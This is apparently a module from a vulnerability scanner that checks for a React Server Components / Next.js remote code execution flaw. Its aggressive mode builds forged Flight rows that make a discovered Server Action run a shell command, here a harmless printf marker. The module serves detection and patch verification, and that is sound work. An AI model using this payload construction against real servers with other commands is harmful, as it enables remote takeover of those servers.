from __future__ import annotations

import base64
import html
import json
import re
import secrets
import urllib.parse
from typing import Any

from ...core.http import HttpClient
from ...core.models import Confidence, Finding, Status
from .cve_2025_55182 import detect_rsc

CVE_ID = "CVE-2026-126187"
NAME = "React Server Components Flight typed-array desync RCE"
RULE = (
    "react-server-dom-webpack/parcel/turbopack 19.0.0-19.0.8, 19.1.0-19.1.9, "
    "19.2.0-19.2.8, 19.3.0; Next.js 16.0.0-16.4.0 with Cache Components"
)
TYPE = "Remote Code Execution"
EXPLOIT_MODES = ["safe", "aggressive"]
MARKER_PREFIX = "PROOFCMS_126187_"


def _lower_headers(response: dict[str, Any]) -> dict[str, str]:
    return {str(key).lower(): str(value) for key, value in (response.get("headers") or {}).items()}


def _build_blob(forged_rows: str, chunk_id: str, overread: int) -> tuple[bytes, int, int]:
    """Place forged Flight rows at the decoder's post-desync resume offset."""

    forged = forged_rows.encode("latin-1")
    length = overread + len(forged)
    resume_at = overread
    for _ in range(8):
        header = f"{chunk_id}:o{length:x},"
        resume_at = overread - len(header)
        length = resume_at + len(forged)
    blob = bytearray(b"F" * length)
    blob[resume_at : resume_at + len(forged)] = forged
    return bytes(blob), resume_at, length


def _annotation_path(blob: bytes) -> str:
    encoded = urllib.parse.quote(base64.b64encode(blob).decode(), safe="")
    return "/?annotation=" + encoded


def _extract_summary(page: str) -> Any:
    match = re.search(r"<pre[^>]*>(.*?)</pre>", page, re.DOTALL)
    if not match:
        return None
    raw = re.sub(r"<!--.*?-->", "", match.group(1), flags=re.DOTALL).strip()
    try:
        return json.loads(html.unescape(raw))
    except (json.JSONDecodeError, ValueError):
        return None


def _layouts() -> list[tuple[str, int]]:
    layouts = [("4", 8192)]
    for chunk_id in range(1, 9):
        for overread in (4096, 8192, 16384):
            candidate = (str(chunk_id), overread)
            if candidate not in layouts:
                layouts.append(candidate)
    return layouts


def _annotation_value(summary: Any) -> Any:
    if isinstance(summary, dict):
        return summary.get("annotation")
    return None


def safe_probe(target_url: str, timeout: int, proxy: str | None) -> dict[str, Any]:
    """Prove the framing desync with a data-row marker; never run an action."""

    marker = MARKER_PREFIX + secrets.token_hex(6)
    client = HttpClient(base_url=target_url, timeout=timeout, proxy=proxy)
    attempts: list[dict[str, Any]] = []
    for chunk_id, overread in _layouts():
        forged = f'{chunk_id}:{{"marker":"{marker}"}}\n'
        blob, resume_at, length = _build_blob(forged, chunk_id, overread)
        response = client.get(_annotation_path(blob), timeout=timeout)
        page = str(response.get("body") or "")
        summary = _extract_summary(page)
        annotation = _annotation_value(summary)
        parsed = isinstance(annotation, (dict, list)) and marker in json.dumps(annotation)
        attempts.append(
            {
                "chunk_id": chunk_id,
                "overread": overread,
                "status": int(response.get("status") or 0),
                "parsed": parsed,
                "annotation": annotation if isinstance(annotation, (dict, list)) else str(annotation)[:80],
            }
        )
        if parsed:
            return {
                "confirmed": True,
                "marker": marker,
                "chunk_id": chunk_id,
                "overread": overread,
                "blob_length": length,
                "resume_at": resume_at,
                "attempts": attempts[-3:],
            }
    return {
        "confirmed": False,
        "marker": marker,
        "attempts": attempts[-6:],
    }


def _discover_action_id(
    client: HttpClient,
    target_url: str,
    timeout: int,
) -> str | None:
    page = client.get("/", timeout=timeout)
    text = str(page.get("body") or "")
    match = re.search(r"\$ACTION_ID_([0-9a-fA-F]{40,})", text)
    if match:
        return match.group(1).lower()

    root = target_url.rstrip("/") + "/"
    for source in re.findall(r"<script[^>]+src=[\"']([^\"']+)[\"']", text):
        script_url = urllib.parse.urljoin(root, source)
        script = client.get(script_url, timeout=timeout)
        script_text = str(script.get("body") or "")
        match = re.search(
            r"createServerReference[^\n]{0,200}[\"']([0-9a-fA-F]{40,})[\"']",
            script_text,
        )
        if match:
            return match.group(1).lower()
    return None


def aggressive_probe(target_url: str, timeout: int, proxy: str | None) -> dict[str, Any]:
    """Invoke the discovered Server Action with a harmless printf marker."""

    marker = MARKER_PREFIX + secrets.token_hex(6)
    command = f"printf {marker}"
    client = HttpClient(base_url=target_url, timeout=timeout, proxy=proxy)
    action_id = _discover_action_id(client, target_url, timeout)
    if not action_id:
        return {
            "confirmed": False,
            "marker": marker,
            "action_id": None,
            "error": "no Server Action id discovered",
        }

    attempts: list[dict[str, Any]] = []
    for chunk_id, overread in _layouts():
        forged = (
            f"6:{json.dumps([command], separators=(',', ':'))}\n"
            f'5:{{"id":"{action_id}","bound":"$@6"}}\n'
            f'{chunk_id}:{{"then":"$h5"}}\n'
        )
        blob, resume_at, length = _build_blob(forged, chunk_id, overread)
        response = client.get(_annotation_path(blob), timeout=timeout)
        page = str(response.get("body") or "")
        summary = _extract_summary(page)
        annotation = _annotation_value(summary)
        confirmed = isinstance(annotation, str) and marker in annotation
        attempts.append(
            {
                "chunk_id": chunk_id,
                "overread": overread,
                "status": int(response.get("status") or 0),
                "confirmed": confirmed,
                "annotation": str(annotation)[:120],
            }
        )
        if confirmed:
            return {
                "confirmed": True,
                "marker": marker,
                "action_id": action_id,
                "chunk_id": chunk_id,
                "overread": overread,
                "blob_length": length,
                "resume_at": resume_at,
                "attempts": attempts[-3:],
            }
    return {
        "confirmed": False,
        "marker": marker,
        "action_id": action_id,
        "attempts": attempts[-6:],
    }


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    **kwargs: Any,
) -> Finding:
    del cms_version, kwargs
    detection = detect_rsc(target_url, timeout, proxy)
    evidence: dict[str, Any] = {"rsc": detection}
    if not detection["detected"]:
        return Finding(
            CVE_ID,
            NAME,
            Status.NOT_DETECTED,
            Confidence.LOW,
            "React Server Components / Next.js Cache Components",
            affected_rule=RULE,
            exploit_available=True,
            detail="No React Server Components App Router markers were observed in the root response.",
            action="Confirm the framework and React version from the build manifest or package inventory.",
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    if not run_exploit_check:
        return Finding(
            CVE_ID,
            NAME,
            Status.NOT_CONFIRMED,
            Confidence.MEDIUM,
            "React Server Components / Next.js Cache Components",
            affected_rule=RULE,
            exploit_available=True,
            detail=(
                "React Server Components were detected, but the typed-array desync probe was not requested. "
                "This issue requires a `use cache` function that returns multiple typed arrays over one "
                "ArrayBuffer plus an attacker-controlled value."
            ),
            action="Run the safe probe against an authorized lab; use aggressive mode only in isolation.",
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    if exploit_mode == "aggressive":
        proof = aggressive_probe(target_url, timeout, proxy)
        evidence.update(proof)
        if proof["confirmed"]:
            return Finding(
                CVE_ID,
                NAME,
                Status.VULNERABLE,
                Confidence.CONFIRMED,
                "React Server Components / Next.js Cache Components",
                affected_rule=RULE,
                exploit_available=True,
                exploit_ran=True,
                detail=(
                    "A forged Flight row at the post-desync resume offset invoked the discovered "
                    "Server Action with a harmless printf marker; the marker was returned in the page summary."
                ),
                action="Upgrade Next.js to 16.4.1+ and the RSC packages to 19.0.9/19.1.10/19.2.9/19.3.1+.",
                proof_url=target_url.rstrip("/") + "/",
                evidence=evidence,
                vulnerability_type=TYPE,
            )
        return Finding(
            CVE_ID,
            NAME,
            Status.NOT_CONFIRMED,
            Confidence.HIGH,
            "React Server Components / Next.js Cache Components",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            detail=(
                "The forged action payload did not return the printf marker. The target may be patched, "
                "may not expose a compatible cached `use cache` layout, or may have no discoverable action."
            ),
            action="Check the resolved Next.js/RSC versions and the cached function's typed-array layout.",
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    proof = safe_probe(target_url, timeout, proxy)
    evidence.update(proof)
    if proof["confirmed"]:
        return Finding(
            CVE_ID,
            NAME,
            Status.VULNERABLE,
            Confidence.CONFIRMED,
            "React Server Components / Next.js Cache Components",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            detail=(
                "A forged data row at the post-desync resume offset was parsed as the annotation value; "
                "the marker appeared in the page summary. No Server Action was executed."
            ),
            action="Upgrade Next.js to 16.4.1+ and the RSC packages to 19.0.9/19.1.10/19.2.9/19.3.1+.",
            proof_url=target_url.rstrip("/") + "/",
            evidence=evidence,
            vulnerability_type=TYPE,
        )
    return Finding(
        CVE_ID,
        NAME,
        Status.NOT_CONFIRMED,
        Confidence.HIGH,
        "React Server Components / Next.js Cache Components",
        affected_rule=RULE,
        exploit_available=True,
        exploit_ran=True,
        detail=(
            "React Server Components were detected, but the safe desync marker was not parsed. "
            "The target may be patched, may not meet the multiple-typed-array precondition, or may use "
            "a different cached layout."
        ),
        action="Check the resolved Next.js/RSC versions and the cached function's typed-array layout.",
        evidence=evidence,
        vulnerability_type=TYPE,
    )


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "generic",
        "name": NAME,
        "component": "React Server Components / Next.js Cache Components",
        "affected_rule": RULE,
        "affected_versions": [
            "19.0.0-19.0.8",
            "19.1.0-19.1.9",
            "19.2.0-19.2.8",
            "19.3.0",
            "Next.js 16.0.0-16.4.0",
        ],
        "exploit_available": True,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": True,
        "vulnerability_type": TYPE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-20",
        "updated": "2026-11-20",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-126187",
            "https://github.com/react/react/security/advisories/GHSA-xqc2-xf4c-x3h3",
            "https://github.com/vercel/next.js/security/advisories/GHSA-673q-mjm6-r5xr",
            "https://www.stepsecurity.io/blog/cve-2026-126187-react-flight-rce",
        ],
    }
